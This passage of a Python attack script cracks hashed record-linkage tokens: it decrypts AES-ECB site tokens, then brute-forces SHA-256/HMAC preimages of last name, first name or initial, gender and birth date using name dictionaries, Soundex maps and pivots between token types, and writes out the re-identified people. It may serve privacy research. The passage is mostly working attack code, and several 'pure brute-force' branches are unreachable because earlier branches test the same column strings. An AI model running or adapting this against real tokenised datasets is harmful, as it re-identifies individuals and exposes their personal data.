    h_ln = init_hasher(ln_b + SEP)
    
    # Generate all first names (e.g., M400 -> "max", "maxi", "maximilian"...)
    # The generator already enforces the correct first initial (fi_b)
    # by starting with the first letter of the soundex code.
    for fn_b in generate_soundex_preimages(sdx_fn_str, max_length=15): # 15 is a reasonable max
        if not fn_b:
            continue
            
        # H(ln|fn|)
        h_fn = h_ln.copy(); h_fn.update(fn_b); h_fn.update(SEP)
        # H(ln|fn|g|)
        h_sig = h_fn.copy(); h_sig.update(g_b); h_sig.update(SEP)
        # H(ln|fn|g|dob)
        h_final = h_sig.copy(); h_final.update(dob_b)
        
        mt = digest_and_count(h_final)
        if contains(mt):
            hits[mt] = (ln_b, fn_b, g_b, dob_b)
            
    return hits

# =============================
# Dictionaries
# =============================

def use_dictionaries(lang: str, bruteforce: bool):
    """Use hardcoded dictionaries."""
    global TOP_FIRST, TOP_LAST, TOP_ADDRESS

    if bruteforce == False:
        if lang == "de":
            with open("vornamen.txt", "r", encoding="utf-8") as f:
                TOP_FIRST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
            with open("nachnamen.txt", "r", encoding="utf-8") as f:
                TOP_LAST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
            with open("strassennamen.txt", "r", encoding="utf-8") as f:
                TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
        elif lang == "us":
            with open("firstnames.txt", "r", encoding="utf-8") as f:
                TOP_FIRST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
            with open("lastnames.txt", "r", encoding="utf-8") as f:
                TOP_LAST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
            with open("streetnames.txt", "r", encoding="utf-8") as f:
                TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
        else:
            raise ValueError(f"Unsupported language for hardcoded dictionaries: {lang}")
    elif bruteforce == True:
        if lang == "de":
            with open("strassennamen.txt", "r", encoding="utf-8") as f:
                TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
        elif lang == "us":
            with open("streetnames.txt", "r", encoding="utf-8") as f:
                TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
        else:
            raise ValueError(f"Unsupported language for hardcoded dictionaries: {lang}")
    else:
        raise ValueError(f"Invalid bruteforce flag: {bruteforce}")
    print(f"[*] Using hardcoded dictionaries: firsts={len(TOP_FIRST)}, lasts={len(TOP_LAST)}, addresses={len(TOP_ADDRESS)}")

# =============================
# Similiar DB Distribution
# =============================

# The distribution file (for frequency lists) will be provided via CLI (--dist-file);
# we initialize the TOP_* structures lazily after parsing arguments.

def load_distribution(dist_file: str, top_n: int):
    """Load a distribution CSV (similar to ohio_cleaned.csv) and populate global TOP_ lists.

    Expected columns (case-sensitive): first_name, last_name, address
    """
    global TOP_FIRST, TOP_LAST, TOP_ADDRESS
    df = pd.read_csv(dist_file)

    missing = [c for c in ["first_name", "last_name", "address"] if c not in df.columns]
    if missing:
        raise ValueError(f"Distribution file '{dist_file}' is missing required columns: {missing}")

    TOP_FIRST = df["first_name"].astype(str).str.lower().value_counts().head(top_n).index.tolist()
    TOP_LAST = df["last_name"].astype(str).str.lower().value_counts().head(top_n).index.tolist()
    TOP_ADDRESS = df["address"].astype(str).str.lower().value_counts().head(top_n).index.tolist()

    print(f"[*] Loaded distribution file '{dist_file}': top_n={top_n} (firsts={len(TOP_FIRST)}, lasts={len(TOP_LAST)}, addresses={len(TOP_ADDRESS)})")

# =============================
# Orchestrator
# =============================

def run_attack(args):
    # Load distribution for frequency-based dictionaries
    if args.dist_file:
        load_distribution(args.dist_file, args.top_n)
    elif args.dist_file == "" and args.bruteforce == False:
        use_dictionaries(args.lang, args.bruteforce)
    elif args.dist_file == "" and args.bruteforce == True:
        print("[*] Running in pure brute-force mode (use only street names).")
        use_dictionaries(args.lang, args.bruteforce)
    else:
        raise SystemExit("--dist-file or --lang is required to provide the frequency distribution CSV")

    # Bytes normalization
    TOP_FIRST_B  = to_bytes_list(TOP_FIRST)
    TOP_LAST_B   = to_bytes_list(TOP_LAST)
    TOP_ADDRESS_ = TOP_ADDRESS[:] 
    DOBS_B       = precompute_dobs(min_year, max_year)
    FN_BY_INITIAL, FN_BY_SDX, LN_BY_SDX, SDX_LAST, SDX_FIRST, SDX_LAST_B, SDX_FIRST_B = build_soundex_maps(TOP_FIRST_B, TOP_LAST_B)
    HOUSE_NUMBERS = precompute_house_numbers(args.lang, max_de=500, max_us=1000)
    FIRST3_MAP   = build_first3_map(TOP_FIRST_B)  

    # reverse soundex cache for last names
    last_to_sdx = {ln_b: sdx for sdx, names in LN_BY_SDX.items() for ln_b in names}

    """pri_mmdd = dob_prior_from_dist(pd.read_csv(args.dist_file)) if args.dist_file else {}
    DOBS_ORDERED = order_dobs(min_year, max_year, pri_mmdd) if pri_mmdd else DOBS_B"""

    print("[*] Precomputing all possible Soundex codes...")
    ALL_SDX_LN, ALL_SDX_FN = precompute_all_soundex_codes()
    print(f"    -> Generated {len(ALL_SDX_LN)} LN codes and {len(ALL_SDX_FN)} FN codes.")

    t1_hits = {}
    t2_hits = {}
    t3_pivot_hits = {}
    t4_pivot_hits = {}
    t7_hits = {}
    t9_pivot_hits = {}
    t1_time = t2_time = t3_time = t4_time = t7_time = t9_time = None

    # Master function
    if args.master_salt:
        ms = parse_bytes(args.master_salt)
        master_func = lambda s: master_hmac(ms, s)
        init_hasher = make_init_hasher(ms)
        print("[*] Using HMAC-SHA256(master_salt, token_input).")
    else:
        master_func = lambda s: master_sha256(s)
        init_hasher = make_init_hasher(None)
        print("[*] Using SHA-256(token_input) (no master salt).")

    # Site key: AES-256 requires 32 bytes
    site_key = parse_bytes(args.site_key, expect_len=32)
    print(f"[*] Using AES-256-ECB for site token decryption (key length={len(site_key)}).")

    cols = [c.strip() for c in args.columns.split(",")]
    # Load & decrypt
    raw = load_site_tokens(args.infile, cols)
    rows = raw["_RAW"]
    dec = decrypt_columns(rows, site_key, cols)

    # If everything is empty, bail early with a hint
    if all(len(dec[c]) == 0 for c in cols):
        print("[!] No master tokens decrypted. Check: correct AES mode (ECB), key (32 bytes), base64 format, and that tokens are actually encrypted site tokens.")
        return

    # =============================
    # T1 --> T2 --> T4 --> T3 --> T9
    # =============================

    if args.columns == "T1,T2,T4,T3,T9":
        # Phase 1: attack lowest-entropy tokens first (T1, T2)
        t1_hits = {}
        t1_time = None
        if "T1" in dec:
            print("[*] Attacking T1 (ln|fi|g|dob)...")
            start = time.time()
            #t1_hits = attack_entropy_first_T1(master_func, dec["T1"], label="T1")
            t1_hits = attack_T1_fast(dec["T1"], TOP_LAST_B, INITIALS_B, DOBS_B, init_hasher)
            t1_time = time.time() - start
            print(f"     -> Found {len(t1_hits)} T1 preimages")
            print(f"[Timer] T1: {t1_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) using T1 (ln|fi|g|dob)...")
            start = time.time()
            #t2_hits = attack_entropy_first_T2(master_func, dec["T2"], label="T2")
            for _mt1, (ln_b, fi_b, g_b, dob_b) in t1_hits.items():
                out = attack_T2_via_T1(dec["T2"], SDX_FIRST, ln_b, fi_b, g_b, dob_b, last_to_sdx, init_hasher)
                t2_hits.update(out)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        # Phase 2: pivot into T4 using knowledge from T1 (and optionally T2)
        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t1_hits:
            print("[*] Pivoting to T4 (ln|fn|g|dob) using T1 (and T2 if available)...")
            start = time.time()
            t2_idx = defaultdict(list)
            for _mt, (sdx_ln, sdx_fn, g, dob) in t2_hits.items():
                t2_idx[(sdx_ln.decode(), g.decode(), dob.decode())].append(sdx_fn.decode())
            for _mt1, (ln_b, fi_b, g_b, dob_b) in t1_hits.items():
                sdx_ln_cached = last_to_sdx.get(ln_b) or soundex(ln_b.decode())
                key = (sdx_ln_cached, g_b.decode(), dob_b.decode())
                if key in t2_idx:
                    for sdx_fn in t2_idx[key]:
                        out = pivot_to_T4_fast(dec["T4"], FN_BY_INITIAL, FN_BY_SDX,
                                               (ln_b, fi_b, g_b, dob_b),
                                               (None, sdx_fn),
                                               init_hasher)
                        t4_pivot_hits.update(out)
                else:
                    out = pivot_to_T4_fast(dec["T4"], FN_BY_INITIAL, FN_BY_SDX,
                                           (ln_b, fi_b, g_b, dob_b),
                                           None,
                                           init_hasher)
                    t4_pivot_hits.update(out)
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

    # =============================
    # T1 --> T2 --> T7 --> T4 --> T3 --> T9
    # =============================

    elif args.columns == "T1,T2,T7,T4,T3,T9":
        t1_hits = {}
        t1_time = None
        if "T1" in dec:
            print("[*] Attacking T1 (ln|fi|g|dob)...")
            start = time.time()
            t1_hits = attack_T1_fast(dec["T1"], TOP_LAST_B, INITIALS_B, DOBS_B, init_hasher)
            t1_time = time.time() - start
            print(f"     -> Found {len(t1_hits)} T1 preimages")
            print(f"[Timer] T1: {t1_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) using T1 (ln|fi|g|dob)...")
            start = time.time()
            for _mt1, (ln_b, fi_b, g_b, dob_b) in t1_hits.items():
                out = attack_T2_via_T1(dec["T2"], SDX_FIRST, ln_b, fi_b, g_b, dob_b, last_to_sdx, init_hasher)
                t2_hits.update(out)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")
        
        t7_hits = {}
        t7_time = None
        if "T7" in dec and t2_hits and t1_hits:
            print("[*] Attacking T7 (ln|fi3|g|dob) using T1 (ln|fi|g|dob) and T2 (sdx(ln)|sdx(fn)|g|dob)...")
            start = time.time()
            # build t1_index using cache
            if 't1_index' not in locals():
                t1_index = defaultdict(list)
                for (_mt1, (ln_b, fi_b, g_b, dob_b)) in t1_hits.items():
                    sdx_ln_cached = last_to_sdx.get(ln_b)
                    if not sdx_ln_cached:
                        try:
                            sdx_ln_cached = soundex(ln_b.decode("utf-8"))
                        except Exception:
                            continue
                    if not sdx_ln_cached:
                        continue
                    t1_index[(sdx_ln_cached, g_b, dob_b)].append((ln_b, fi_b))
            for (_mt2, (sdx_ln_b, sdx_fn_b, g_b, dob_b)) in t2_hits.items():
                key = (sdx_ln_b.decode("utf-8"), g_b, dob_b)
                for (ln_b, fi_b) in t1_index.get(key, []):
                    out = attack_T7_via_T2_T1(dec["T7"], ln_b, sdx_fn_b, g_b, dob_b, FN_BY_SDX, init_hasher)
                    t7_hits.update(out)
            t7_time = time.time() - start
            print(f"     -> Found {len(t7_hits)} T7 preimages")
            print(f"[Timer] T7: {t7_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t7_hits:
            print("[*] Pivoting to T4 (ln|fn|g|dob) using T7 (ln|fi3|g|dob)...")
            start = time.time()
            for _mt7, (ln_b, fi3_b, g_b, dob_b) in t7_hits.items():
                out = pivot_to_T4_via_T7(dec["T4"], ln_b, fi3_b, g_b, dob_b, FIRST3_MAP, init_hasher)
                t4_pivot_hits.update(out)
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

    # =============================
    # T2 --> T1 --> T4 --> T3 --> T9
    # =============================

    elif args.columns == "T2,T1,T4,T3,T9":
        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) with FULL SOUNDEX BRUTE-FORCE...")
            start = time.time()
            t2_hits = attack_T2_fast(dec["T2"], list(ALL_SDX_LN), list(ALL_SDX_FN), DOBS_B, init_hasher)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t1_hits = {}
        t1_time = None
        if "T1" in dec:
            print("[*] Attacking T1 (ln|fi|g|dob) using T2 (sdx(ln)|sdx(fn)|g|dob) preimages...")
            start = time.time()
            for _mt2, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items():
                # Use the new generator-based attack
                out = attack_T1_via_T2(dec["T1"], sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
                t1_hits.update(out)
            t1_time = time.time() - start
            print(f"     -> Found {len(t1_hits)} T1 preimages")
            print(f"[Timer] T1: {t1_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t1_hits:
            print("[*] Pivoting to T4 (ln|fn|g|dob) using T1 (and T2 if available)...")
            start = time.time()
            t2_idx = defaultdict(list)
            for _mt, (sdx_ln, sdx_fn, g, dob) in t2_hits.items():
                t2_idx[(sdx_ln.decode(), g.decode(), dob.decode())].append(sdx_fn.decode())
            for _mt1, (ln_b, fi_b, g_b, dob_b) in t1_hits.items():
                sdx_ln_cached = last_to_sdx.get(ln_b)
                if not sdx_ln_cached:
                    try: sdx_ln_cached = soundex(ln_b.decode())
                    except Exception: sdx_ln_cached = ""
                        
                key = (sdx_ln_cached, g_b.decode(), dob_b.decode())
                
                # We need to find the T4 from T1. T2 info helps narrow it down.
                # Use dictionary-based pivot if T2 not helpful
                out = pivot_to_T4_fast(dec["T4"], FN_BY_INITIAL, FN_BY_SDX,
                                       (ln_b, fi_b, g_b, dob_b),
                                       None, # Base pivot on T1 dict
                                       init_hasher)
                t4_pivot_hits.update(out)

            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")
        
    # =============================
    # T2 --> T1 --> T7 --> T4 --> T3 --> T9
    # =============================

    elif args.columns == "T2,T1,T7,T4,T3,T9":
        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) with FULL SOUNDEX BRUTE-FORCE...")
            start = time.time()
            t2_hits = attack_T2_fast(dec["T2"], list(ALL_SDX_LN), list(ALL_SDX_FN), DOBS_B, init_hasher)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t1_hits = {}
        t1_time = None
        if "T1" in dec:
            print("[*] Attacking T1 (ln|fi|g|dob) using T2 (sdx(ln)|sdx(fn)|g|dob) preimages...")
            start = time.time()
            for _mt2, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items():
                out = attack_T1_via_T2(dec["T1"], sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
                t1_hits.update(out)
            t1_time = time.time() - start
            print(f"     -> Found {len(t1_hits)} T1 preimages")
            print(f"[Timer] T1: {t1_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t7_hits = {}
        t7_time = None
        if "T7" in dec:
            print("[*] Attacking T7 (ln|fi3|g|dob) using T1 (ln|fi|g|dob) preimages...")
            start = time.time()
            for _mt1, (ln_b, fi_b, g_b, dob_b) in t1_hits.items():
                out = attack_T7_via_T1(dec["T7"], ln_b, fi_b, g_b, dob_b, init_hasher)
                t7_hits.update(out)
            t7_time = time.time() - start
            print(f"     -> Found {len(t7_hits)} T7 preimages")
            print(f"[Timer] T7: {t7_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t7_hits:
            print("[*] Pivoting to T4 (ln|fn|g|dob) using T7 (ln|fi3|g|dob)...")
            start = time.time()
            for _mt7, (ln_b, fi3_b, g_b, dob_b) in t7_hits.items():
                out = pivot_to_T4_via_T7(dec["T4"], ln_b, fi3_b, g_b, dob_b, FIRST3_MAP, init_hasher)
                t4_pivot_hits.update(out)
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

    # =============================
    # T2 --> T7 --> T4 --> T3 --> T9
    # =============================

    elif args.columns == "T2,T7,T4,T3,T9":
        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) with FULL SOUNDEX BRUTE-FORCE...")
            start = time.time()
            t2_hits = attack_T2_fast(dec["T2"], list(ALL_SDX_LN), list(ALL_SDX_FN), DOBS_B, init_hasher)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t7_hits = {}
        t7_time = None
        if "T7" in dec:
            print("[*] Attacking T7 (ln|fi3|g|dob) using T2 (sdx(ln)|sdx(fn)|g|dob) preimages...")
            start = time.time()
            for _mt2, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items():
                out = attack_T7_via_T2(dec["T7"], sdx_ln_b, sdx_fn_b, g_b, dob_b, init_hasher)
                t7_hits.update(out)
            t7_time = time.time() - start
            print(f"     -> Found {len(t7_hits)} T7 preimages")
            print(f"[Timer] T7: {t7_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t7_hits:
            print("[*] Pivoting to T4 (ln|fn|g|dob) using T7 (ln|fi3|g|dob)...")
            start = time.time()
            for _mt7, (ln_b, fi3_b, g_b, dob_b) in t7_hits.items():
                # We need to find the T4. We have ln, fi3, g, dob.
                # We can't use the dictionary-based pivot_to_T4_via_T7
                # because the ln is brute-forced and may not be in the dict.
                
                # We need to pivot using T7 and T2.
                # We need to find the T2 hit that corresponds to this T7 hit.
                # This is complex. Let's find the T2 hit first.
                
                # This path is hard. A simpler way is to find T4 from T7+T2
                
                # Find the T2 hits that could have generated this T7 hit
                sdx_ln_str = ""
                sdx_fn_str = ""
                try:
                    sdx_ln_str = soundex(ln_b.decode())
                    # We can't get sdx_fn from fi3_b
                except Exception:
                    pass
                
                # We will use the T7->T4 pivot that re-generates all T4 candidates
                # from the T7 hit.
                
                # Find all T2 hits that match this ln_b, g_b, dob_b
                t2_matches = []
                try:
                    sdx_ln_str = soundex(ln_b.decode())
                    for mt, (sdx_l, sdx_f, g, dob) in t2_hits.items():
                        if g == g_b and dob == dob_b and sdx_l.decode() == sdx_ln_str:
                            t2_matches.append((sdx_l, sdx_f))
                except Exception:
                    pass
                
                if t2_matches:
                    for sdx_l, sdx_f in t2_matches:
                        out = pivot_to_T4_via_T7_T2(dec["T4"], sdx_l, sdx_f, fi3_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
                        t4_pivot_hits.update(out)
                
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

    # =============================
    # T1 --> T7 --> T4 --> T3 --> T9
    # =============================

    elif args.columns == "T1,T7,T4,T3,T9":
        t1_hits = {}
        t1_time = None
        if "T1" in dec:
            print("[*] Attacking T1 (ln|fi|g|dob)...")
            start = time.time()
            #t1_hits = attack_entropy_first_T1(master_func, dec["T1"], label="T1")
            t1_hits = attack_T1_fast(dec["T1"], TOP_LAST_B, INITIALS_B, DOBS_B, init_hasher)
            t1_time = time.time() - start
            print(f"     -> Found {len(t1_hits)} T1 preimages")
            print(f"[Timer] T1: {t1_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t7_hits = {}
        t7_time = None
        if "T7" in dec and t1_hits:
            print("[*] Attacking T7 (ln|fi3|g|dob) using T1 (ln|fi|g|dob)...")
            start = time.time()
            #t7_hits = attack_entropy_first_T7(master_func, dec["T7"], label="T7")
            for _mt1, (ln_b, fi_b, g_b, dob_b) in t1_hits.items():
                out = attack_T7_via_T1(dec["T7"], ln_b, fi_b, g_b, dob_b, init_hasher)
                t7_hits.update(out)
            t7_time = time.time() - start
            print(f"     -> Found {len(t7_hits)} T7 preimages")
            print(f"[Timer] T7: {t7_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t7_hits:
            print("[*] Pivoting to T4 (ln|fn|g|dob) using T7...")
            start = time.time()
            for _mt7, (ln_b, fi3_b, g_b, dob_b) in t7_hits.items():
                out = pivot_to_T4_via_T7(dec["T4"], ln_b, fi3_b, g_b, dob_b, FIRST3_MAP, init_hasher)
                t4_pivot_hits.update(out)
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

    # =============================
    # PURE BRUTEFORCE: T2 -> T1 -> T7 -> T4 --> T3 -> T9
    # =============================

    elif args.columns == "T2,T1,T7,T4,T3,T9" and args.bruteforce == True:
        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) with FULL SOUNDEX BRUTE-FORCE...")
            start = time.time()
            t2_hits = attack_T2_fast(dec["T2"], list(ALL_SDX_LN), list(ALL_SDX_FN), DOBS_B, init_hasher)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t1_hits_pure = {} # Will store {mt: ((t1_preimage), (t2_preimage))}
        t1_time = None
        if "T1" in dec:
            print("[*] (PURE) Attacking T1 using T2 preimages...")
            start = time.time()
            for _mt2, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items():
                # Use the new "pure" function
                out = attack_T1_via_T2_pure(dec["T1"], sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
                t1_hits_pure.update(out)
            t1_time = time.time() - start
            # Extract T1 hits for reporting
            t1_hits = {mt: preimages[0] for mt, preimages in t1_hits_pure.items()}
            print(f"     -> Found {len(t1_hits)} T1 preimages")
            print(f"[Timer] T1: {t1_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t7_hits_pure = {} # Will store {mt: ((t7_preimage), (t2_preimage))}
        t7_time = None
        if "T7" in dec:
            print("[*] (PURE) Attacking T7 using T1 (with T2 context)...")
            start = time.time()
            for _mt1, (t1_preimage, t2_preimage) in t1_hits_pure.items():
                # Use the new "pure" function
                out = attack_T7_via_T1_pure(dec["T7"], t1_preimage, t2_preimage, init_hasher)
                t7_hits_pure.update(out)
            t7_time = time.time() - start
            # Extract T7 hits for reporting
            t7_hits = {mt: preimages[0] for mt, preimages in t7_hits_pure.items()}
            print(f"     -> Found {len(t7_hits)} T7 preimages")
            print(f"[Timer] T7: {t7_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t7_hits_pure:
            print("[*] (PURE) Pivoting to T4 using T7 and T2 context...")
            start = time.time()
            for _mt7, (t7_preimage, t2_preimage) in t7_hits_pure.items():
                (ln_b, fi3_b, g_b, dob_b) = t7_preimage
                (sdx_ln_b, sdx_fn_b, _, _) = t2_preimage # g and dob are already in t7_preimage
                
                # THIS IS THE KEY: Call the correct pivot function
                out = pivot_to_T4_via_T7_T2(dec["T4"], sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
                t4_pivot_hits.update(out)
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

    # =============================
    # PURE BRUTEFORCE: T2 -> T7 -> T4 --> T3 -> T9
    # =============================

    elif args.columns == "T2,T7,T4,T3,T9" and args.bruteforce == True:
        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) with FULL SOUNDEX BRUTE-FORCE...")
            start = time.time()
            t2_hits = attack_T2_fast(dec["T2"], list(ALL_SDX_LN), list(ALL_SDX_FN), DOBS_B, init_hasher)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t7_hits_pure = {} # Will store {mt: ((t7_preimage), (t2_preimage))}
        t7_time = None
        if "T7" in dec:
            print("[*] (PURE) Attacking T7 using T2 preimages...")
            start = time.time()
            for _mt2, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items():
                # Use the new "pure" function
                out = attack_T7_via_T2_pure(dec["T7"], sdx_ln_b, sdx_fn_b, g_b, dob_b, init_hasher)
                t7_hits_pure.update(out)
            t7_time = time.time() - start
            # Extract T7 hits for reporting
            t7_hits = {mt: preimages[0] for mt, preimages in t7_hits_pure.items()}
            print(f"     -> Found {len(t7_hits)} T7 preimages")
            print(f"[Timer] T7: {t7_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t7_hits_pure:
            print("[*] (PURE) Pivoting to T4 using T7 and T2 context...")
            start = time.time()
            for _mt7, (t7_preimage, t2_preimage) in t7_hits_pure.items():
                (ln_b, fi3_b, g_b, dob_b) = t7_preimage
                (sdx_ln_b, sdx_fn_b, _, _) = t2_preimage
                
                # Call the correct pivot function
                out = pivot_to_T4_via_T7_T2(dec["T4"], sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
                t4_pivot_hits.update(out)
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")
    
    # =============================
    # PURE BRUTEFORCE: T2 -> T1 -> T4 --> T3 -> T9
    # =============================

    elif args.columns == "T2,T1,T4,T3,T9" and args.bruteforce == True:
        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) with FULL SOUNDEX BRUTE-FORCE...")
            start = time.time()
            t2_hits = attack_T2_fast(dec["T2"], list(ALL_SDX_LN), list(ALL_SDX_FN), DOBS_B, init_hasher)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t1_hits_pure = {} # Will store {mt: ((t1_preimage), (t2_preimage))}
        t1_time = None
        if "T1" in dec:
            print("[*] (PURE) Attacking T1 using T2 preimages...")
            start = time.time()
            for _mt2, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items():
                # Use the new "pure" function
                out = attack_T1_via_T2_pure(dec["T1"], sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
                t1_hits_pure.update(out)
            t1_time = time.time() - start
            # Extract T1 hits for reporting
            t1_hits = {mt: preimages[0] for mt, preimages in t1_hits_pure.items()}
            print(f"     -> Found {len(t1_hits)} T1 preimages")
            print(f"[Timer] T1: {t1_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t1_hits_pure:
            print("[*] (PURE) Pivoting to T4 using T1 and T2 context...")
            start = time.time()
            for _mt1, (t1_preimage, t2_preimage) in t1_hits_pure.items():
                
                # ***** THIS IS THE FIX *****
                # Call the new pure pivot function instead of pivot_to_T4_fast
                out = pivot_to_T4_via_T1_T2_pure(dec["T4"], t1_preimage, t2_preimage, init_hasher)
                t4_pivot_hits.update(out)
                
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

    # =============================
    # Print results
    # =============================
    with open(args.outfile, "w", encoding="utf-8") as f:
        if t1_hits:
            f.write(f"[T1] {len(t1_hits)} master tokens cracked\n")
            f.write(f"[TIMER] T1: {t1_time:.2f} seconds\n")
            for mt, (ln_b, fi_b, g_b, dob_b) in t1_hits.items():
                f.write(f"MT(hex)={mt.hex()}   ←   ln={ln_b.decode()} fi={fi_b.decode()} g={g_b.decode()} dob={dob_b.decode()}\n")

        if t2_hits:
            f.write(f"[T2] {len(t2_hits)} master tokens cracked\n")
